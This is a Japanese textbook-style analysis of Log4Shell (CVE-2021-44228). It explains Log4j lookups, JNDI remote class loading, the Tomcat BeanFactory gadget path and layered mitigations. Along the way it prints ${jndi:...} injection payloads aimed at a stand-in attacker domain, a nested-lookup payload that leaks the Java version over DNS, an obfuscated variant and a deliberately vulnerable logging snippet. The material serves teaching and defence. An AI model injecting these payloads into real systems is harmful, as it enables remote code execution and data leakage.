## Log4Shellの解析と緩和

### 0. 何が起きたのか——1行のログが招いたリモートコード実行

2021年11月にAlibabaのセキュリティチームが発見し、同年12月10日に公開されたCVE-2021-44228（通称「Log4Shell」）は、Javaで最も広く使われているロギングフレームワークApache Log4j 2に存在した、深刻度が最大値（CVSS 10.0）のリモートコード実行（RCE: Remote Code Execution、攻撃者が任意のコードをサーバー上で実行できる状態）脆弱性です。影響範囲は、Log4j 2に依存するMavenパッケージだけで約7,000件にのぼると報告されており、Minecraft、iCloud、Steam、各種クラウド基盤製品など、業種を問わず世界中のJavaアプリケーションが影響を受けました。

本節では、「なぜユーザー入力を1行ログに出力しただけでRCEに至るのか」という核心のメカニズムを、JNDI（Java Naming and Directory Interface：Javaクライアントが名前を通じてリソースを検索するためのAPI）というJavaの機能仕様まで遡って解説し、実務で使える緩和策を整理します。

### 1. Log4jのLookup機能——「動的な値の埋め込み」という設計思想

Log4j 2には、ログメッセージやログ設定ファイルの中に `${...}` という記法で「動的に解決される値」を埋め込める **Lookup（ルックアップ）** という機能があります。たとえば環境変数を埋め込みたければ `${env:PATH}` 、システムプロパティなら `${sys:user.name}` のように書くと、ログ出力時にLog4jがその場で値を解決して展開します。

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

このLookup機構の実装は、`StrLookup` というインタフェースを実装した多数のクラス（`EnvironmentLookup`、`SystemPropertiesLookup`、`JndiLookup` など）が担っており、ログメッセージの文字列がパターン展開エンジンを通るたびに、`${プレフィックス:値}` という構文が見つかると対応する `StrLookup` 実装が呼び出されて実際の値に置換されます。この「サーバーが受け取った文字列の中身をそのまま構文として解釈し、対応する処理を呼び出す」という挙動こそが、後述するSSTI（Server-Side Template Injection）系の脆弱性群とも通底する本質的な危険パターンです。ログに出す文字列は「ただの表示用テキスト」ではなく、Log4jにとっては「評価対象のミニ言語」だった、という点が最初の理解のポイントです。

問題の中心にあるのが `JndiLookup` クラスです。これは `${jndi:...}` という接頭辞を見つけると、続く文字列をJNDI名としてJavaのJNDI APIに渡し、名前解決（ネームルックアップ）を実行します。

```
${jndi:ldap://attackers-domain.com/a}
${jndi:ldaps://attackers-domain.com/a}
${jndi:rmi://attackers-domain.com/a}
${jndi:dns://attackers-domain.com/a}
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

この4行は、Log4Shellの本質を凝縮したペイロード例です。攻撃者が制御できる何らかの文字列（HTTPリクエストのUser-Agentヘッダ、ログイン失敗時のユーザー名、X-Forwarded-Forヘッダなど、アプリケーションがログに書き出しうる値）にこの文字列を混入させ、それがログに書き込まれた瞬間に、Log4jが「これはJNDIルックアップの指示だ」と解釈して、攻撃者が指定したLDAPサーバーやRMIサーバーへ問い合わせを開始してしまいます。

### 2. 脆弱なコードパターン——なぜ「ただのログ出力」が引き金になるのか

Semgrepのブログでは、以下のような一見無害なログ出力コードが脆弱性の入り口になると説明されています。

```java
public void handle(HttpExchange he) throws IOException {
  String userInput = he.getRequestHeader("some-header");
  log.info("Request User Agent:" + userInput); // vulnerable
}
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

このコードの危険性は、`userInput`（攻撃者が完全にコントロールできる、つまり**sink**：入力が最終的に実行・解釈される危険な代入先、に到達する経路の**source**：攻撃者が制御できる入力の出発点、にあたるHTTPヘッダ値）がそのまま `log.info(...)` に渡っている点にあります。開発者から見ればこれは「アクセスログにUser-Agentを記録しているだけ」の平凡なコードですが、Log4j側からすると「ログに書き込む文字列の中に `${jndi:...}` が含まれていたら、それはルックアップ指示として実行する」という仕様が働いてしまいます。つまり脆弱性の本質は、**「ログという本来受動的であるべき記録先が、実は能動的に文字列を評価するインタプリタになっていた」** という、開発者の期待と実装の乖離にあります。これはテンプレートエンジンにユーザー入力をそのまま渡してしまうSSTI（本章の主題とも関連）と全く同じ形の設計ミスであり、「入力を評価するコンポーネントに、サニタイズなしで外部入力を渡す」というパターンが繰り返し重大な脆弱性を生むことを示す好例です。

### 3. JNDI経由のコード実行——「名前解決」がなぜ「コード実行」になるのか

ここが最も理解を要する部分です。「名前を検索する」だけのはずのJNDIが、なぜコード実行に直結するのでしょうか。

JNDIは、RMI（Remote Method Invocation）、CORBA、LDAP、DNSなど複数のディレクトリ・ネーミングサービスプロトコルを抽象化してJavaプログラムに提供するAPIです。

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

`JndiLookup` が `${jndi:ldap://attackers-domain.com/a}` を渡されると、内部的には `javax.naming.InitialContext#lookup()` に相当する処理を呼び出し、指定されたLDAP（Lightweight Directory Access Protocol：ディレクトリサービスに問い合わせるための軽量プロトコル）サーバーに対して名前解決を要求します。ここで攻撃者が用意した悪性LDAPサーバーは、正規のディレクトリエントリの代わりに、**リモート参照（Reference）オブジェクト** を返します。この参照オブジェクトには「このJavaオブジェクトを生成するファクトリクラスは、このURLにあるJARファイルの中にある」という情報（`javaCodeBase` と `javaFactory` 属性）が含まれています。

MOGWAI LABSの解析では、この挙動を支えるさらに重要な内部実装の詳細として、`Context.lookup()` メソッドが「絶対URLが与えられた場合に、プロトコルとアドレスを動的に切り替えることができる」点が指摘されています。

> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

つまり、Log4j側が最初にLDAPプロトコルで問い合わせを始めても、悪性サーバーが返す参照オブジェクトの中で「実は別のプロトコル・別のアドレスから取得しろ」という指示を含めることができ、JNDIクライアント（Log4jを動かしているJVM）はその指示に従って切り替わってしまいます。この「サーバー側から見えている接続先を、応答の中身によって別の場所に転送させられる」という性質が、後述する各種の緩和策（JEPによるコードベース制限やLDAP専用の防御）を回避しようとする亜種攻撃が繰り返し登場した理由でもあります。

Java側がこの参照オブジェクトを受け取ると、指定されたコードベースURLから対応するJavaクラス（ファクトリクラス）をダウンロードし、それをインスタンス化します。攻撃者がこのファクトリクラスの中に任意のJavaコードを仕込んでおけば、インスタンス化と同時にそのコードが実行される、という流れです。これは実質的に「リモートのJavaクラスをその場でロードして実行する」機能であり、Javaのクラスロード機構そのものを悪用したコード実行経路になります。

### 4. 攻撃条件——「必ず刺さる」わけではない理由

MOGWAI LABSは、実際に任意コード実行まで到達するための前提条件を整理しています。

**外部へのネットワーク接続が必須:**
> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

攻撃が成立するためには、対象アプリケーションが攻撃者のインフラへ**アウトバウンド接続**できる必要があります。単にDNSクエリが飛ぶだけでは不十分で（脆弱性の**存在確認**には使えても）、実際にLDAP/RMIサーバーへの完全な接続性が必要です。これは防御側にとって重要な意味を持ちます——**アウトバウンド通信を厳格に制限（デフォルト拒否）しているネットワーク**では、脆弱なライブラリが存在してもRCEまでは到達しにくく、egress（外向き通信）制御が多層防御として有効に機能する、ということです。

**Javaバージョンによる既定の緩和:**
Java 8u121以降、および7u201以降では、`com.sun.jndi.ldap.object.trustURLCodebase`（および `rmi` 版）のデフォルトが `false` に変更されており、LDAP/RMI経由でのリモートクラスのロードがデフォルトで無効化されています。

> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

つまり2021年時点で比較的新しいJavaランタイムを使っていれば、「リモートJARから任意クラスをロードする」という最も直接的な攻撃経路はすでに塞がれていました。しかし——ここが重要な点ですが——この緩和はあくまで「リモートのバイトコードを直接ロードする」経路を防いでいるだけであり、次に説明する**別の経路**は依然として有効でした。

### 5. 「パッチ済みJVM」でも刺さる経路——デシリアライズガジェットチェーンとの合流

MOGWAI LABSは、`trustURLCodebase` 対策済みの新しいJavaでも、確実にコード実行に至る経路が残っていたと指摘しています。

**信頼できるコード実行が可能なシナリオ:**
- ターゲットがApache Tomcatを使用している場合（`org.apache.naming.factory.BeanFactory` クラスを利用した経路）
- ターゲットがIBM WebSphereを使用している場合（WSDLの操作と一時JARの配置による経路）
- 攻撃者がネイティブなデシリアライズガジェットを利用する場合

> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

これは、Log4Shellが単独の脆弱性ではなく、**JNDIを踏み台にして、対象JVMのクラスパス上にすでに存在する「危険なJavaクラス」を悪用する**、より一般的なJavaデシリアライゼーション攻撃の枠組みに合流する点が本質だという理解につながります。たとえばTomcatの `BeanFactory` は、JNDIから受け取った属性値をJavaBeanのプロパティとして設定できる汎用ファクトリであり、攻撃者は「リモートクラスをロードする」代わりに「対象のクラスパス上に既に存在するこの `BeanFactory` を、任意のプロパティ値とともに呼び出させる」ことで、`trustURLCodebase` の制限を経由せずにオブジェクト生成・プロパティ設定（ひいてはgetter/setter経由の副作用）を引き起こせます。これは本章のテーマである「デシリアライゼーションとガジェットチェーン」——攻撃者が新しいコードを注入するのではなく、**アプリケーションがすでに読み込んでいるクラス群（ガジェット）を、都合よく連鎖させて悪用する**——という考え方そのものです。JNDIインジェクションは「エントリポイント」であり、実際のRCEの多くは、その先につながるデシリアライズガジェットチェーンの巧拙によって成否が決まる、という構造を理解しておくことが重要です。

### 6. 影響を受けるバージョンと修正の経緯（2021年12月〜2022年）

Log4Shell関連の脆弱性は一つのCVEで完結しておらず、初期パッチの回避や関連する別の欠陥が短期間に連鎖して報告されました。年月・バージョンを正確に押さえておくことは、対応の陳腐化を避ける上で重要です。

- **Log4j 2.0-beta9 〜 2.14.1**: CVE-2021-44228（Log4Shell本体）の影響範囲。
- **修正版 2.15.0**（2021年12月10日リリース）: 初期修正。ただし特定の設定（非デフォルトのパターンレイアウトなど）下でDoSやRCEの余地が残ることが後に判明（CVE-2021-45046）。
- **修正版 2.16.0**: JNDIのメッセージルックアップ機能自体を無効化し、`log4j2.enableJndi` を明示的に有効化しない限りJNDI機能を使わせない、というより根本的な対応。
- **CVE-2021-45105**（DoS）および **CVE-2021-44832**（特定の構成下でのRCE）: 2021年12月中に追加で報告。
- **最終的な推奨バージョン 2.17.1 以降**: 上記すべてに対応済み。

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

このように「一度パッチを当てたから終わり」ではなく、短期間に複数回のバージョンアップが必要だった経緯自体が、Log4Shell対応の教訓の一つです。現在（本教科書執筆時点）で新規に対応する場合は、上記の中間バージョン（2.15.0や2.16.0）ではなく、必ず**2.17.1以降の最新安定版**、あるいは公式が案内する後継のLog4j 2.xの最新版を採用してください。

### 7. 緩和策——多層防御としての実務対応

原典2記事が共通して挙げている緩和策を、優先度順に整理します。

**① 最優先: バージョンアップ**

```
Java 8以降を使用している場合、Log4j 2.17.1以降へアップグレードする
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

Log4j 2.16.0以降ではメッセージルックアップ機能自体が既定で無効化されるため、根本的な対策になります。バージョンアップができない特殊なレガシー環境向けの緩和策が以下です。

**② 即時アップグレードできない場合の暫定策**

```
# システムプロパティで無効化
-Dlog4j2.formatMsgNoLookups=true

# または環境変数で無効化
LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

これはLog4j 2.10以降で使用可能な設定で、メッセージ文字列に対する `${...}` 形式のルックアップ展開そのものを無効化します。ただし、この設定は「メッセージパターン」への対策であり、設定ファイル自体に含まれるルックアップ（コンテキストデータ、MDCなど別経路）までは網羅しない場合があったため、あくまで暫定策と位置づけられていた点に注意してください。

**③ ライブラリからの直接除去**

```bash
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/、MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

両記事がまったく同じコマンドを緩和策として紹介しています。これは `log4j-core` のJARファイルから `JndiLookup` クラスそのものを物理的に削除するというアプローチで、「JNDIルックアップという機能自体をバイナリレベルで消してしまう」ため、アップグレードが困難な環境（コンテナイメージのベースが古い、依存関係の解決が複雑で差し替えが難しいなど）では有効な即効性のある対策として広く実施されました。ただし、これはあくまで応急処置であり、正式なバージョンアップに置き換えることが前提です。

**④ パターンレイアウトでの無効化**

```
%m{nolookups}
%msg{nolookups}
%message{nolookups}
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

ログ出力フォーマット（`log4j2.xml` などの設定ファイル）側で、メッセージ部分のルックアップ展開を無効にするパターン指定です。ただしこれも設定ファイル側の対応であり、コード側の対策（後述の静的解析）と組み合わせるべきものです。

**⑤ ネットワーク層での防御**

MOGWAI LABSの分析が示すとおり、攻撃成立にはアウトバウンド接続が必須です。したがって、アプリケーションサーバーからインターネットへの任意の外向き通信（特にLDAP:389/636、RMI関連ポート）をデフォルト拒否し、必要な宛先のみ許可するネットワークポリシー（アウトバウンドのアレイリスト化）は、未知の亜種や将来類似の脆弱性が出た場合にも効く汎用的な多層防御になります。

**⑥ 静的解析による検知**

```
semgrep --config s/chegg:log4j2_tainted_argument
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

これは、攻撃者が制御しうる入力（source）が、サニタイズなしでLog4jのログ出力メソッド（sink）に到達している箇所を、コードベース全体からテイント解析（データフローを追跡し、危険な入力が危険な処理に届くかを検出する解析手法）で洗い出すルールです。「入力→ログ出力」という一見無害に見える経路を機械的に検出できる点が実務上有用で、パッチ適用後の再発防止（新規コードで再びユーザー入力を安易にログへ渡してしまう回帰）にも活用できます。

**⑦ 偵察・攻撃検知のためのシグネチャ**

```
${jndi:ldap://${java:version}.attacker-domain.com/a}
```

> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

これは実際の攻撃観測でよく使われた「偵察用」ペイロードです。`${java:version}` というネストしたLookup（Lookupの中に別のLookupを埋め込める、Log4jの再帰的展開という仕様）を利用し、対象JVMのJavaバージョン文字列をDNSクエリのサブドメインとして攻撃者のドメインへ送出させます。攻撃者はこれを受信することで、対象がJava 8u191以前など「リモートクラスロードが可能な脆弱なバージョン」かどうかを、コード実行なしに判定できます。防御側にとっては、このような入れ子のLookup構文や `java:` プレフィックスを含むリクエスト（ヘッダ、パラメータ、User-Agentなど）自体をWAFやログ監視のシグネチャとして検出する価値があります。ただし、Base64エンコードや大文字小文字の混在、`${${::-j}${::-n}${::-d}${::-i}:...}` のような文字列連結による難読化バリアントが多数確認されているため、単純な `${jndi:` の文字列一致だけでは検知漏れが生じる点に注意が必要です。

### 8. まとめ——この事例から何を持ち帰るか

Log4Shellの本質は、「ログという受動的に見えるコンポーネントが、実は `${...}` という構文を評価するインタプリタだった」という**設計と期待のギャップ**にあります。そしてJNDIという「名前解決」の仕組みが、参照オブジェクトの応答内容次第でプロトコルも接続先も切り替えられる柔軟性を持っていたために、「名前を調べる」だけの操作が「リモートのコードをロードして実行する」操作に転化しました。さらに、Java本体のデフォルト設定強化（`trustURLCodebase=false`）という対策が講じられた後も、対象JVMのクラスパス上に存在する `BeanFactory` のようなガジェットクラスを経由することで、根本的にはデシリアライゼーション攻撃と同じ構造の脅威が残り続けた、という点は次節以降で扱うガジェットチェーン一般の理解にも直結します。

防御としては、単一の対策に頼らず、(1) バージョンアップによる恒久対策、(2) 設定・バイナリレベルでのJNDIルックアップの無効化、(3) アウトバウンド通信制御によるネットワーク層の多層防御、(4) 静的解析によるコードレベルでの回帰防止、という複数レイヤーを組み合わせることが、同種の「外部入力を評価系コンポーネントに直接渡してしまう」脆弱性クラス全般に対する実務上の王道です。
